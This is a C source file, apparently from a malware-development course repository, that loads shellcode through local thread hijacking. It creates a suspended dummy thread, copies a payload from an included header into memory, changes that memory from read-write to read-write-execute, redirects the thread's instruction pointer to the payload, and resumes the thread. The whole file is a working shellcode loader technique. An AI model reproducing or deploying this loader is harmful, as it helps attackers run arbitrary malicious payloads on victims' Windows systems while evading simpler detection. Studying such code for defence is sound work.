#include <Windows.h>
#include <stdio.h>

#include "shellcodes.h"


// Based on:
//   Thread Hijacking - Local Thread Creation
//   https://maldevacademy.com/modules/35
//   @NUL0x4C | @mrd0x : MalDevAcademy


VOID DummyFunction() {
	int		j = rand();
	int		i = j * j;
}


BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE payload, IN SIZE_T payloadSize) {
	PVOID		shellcodeAddress = NULL;
	DWORD		oldProtection = NULL;
	CONTEXT		ThreadCtx;
	ThreadCtx.ContextFlags = CONTEXT_CONTROL;

	// ALLOC RW
	shellcodeAddress = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (shellcodeAddress == NULL) {
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// COPY
	memcpy(shellcodeAddress, payload, payloadSize);

	// RW->RWX
	if (!VirtualProtect(shellcodeAddress, payloadSize, PAGE_EXECUTE_READWRITE, &oldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;	
	}

	// HIJACK THREAD
	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	ThreadCtx.Rip = (DWORD64) shellcodeAddress;
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	return TRUE;
}


int example_3() {
	HANDLE		hThread = NULL;
	DWORD		threadId = NULL;

	PBYTE   payload = (PBYTE)shellcode;
	SIZE_T  payloadSize = sizeof(shellcode);

	// Creating sacrificial thread in suspended state 
	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&DummyFunction, NULL, CREATE_SUSPENDED, &threadId);
	if (hThread == NULL) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	
	// hijacking the sacrificial thread created
	if (!RunViaClassicThreadHijacking(hThread, payload, payloadSize)) {
		return -1;
	}

	// resuming suspended thread, so that it runs our shellcode
	ResumeThread(hThread);
	WaitForSingleObject(hThread, INFINITE);

	return 0;
}
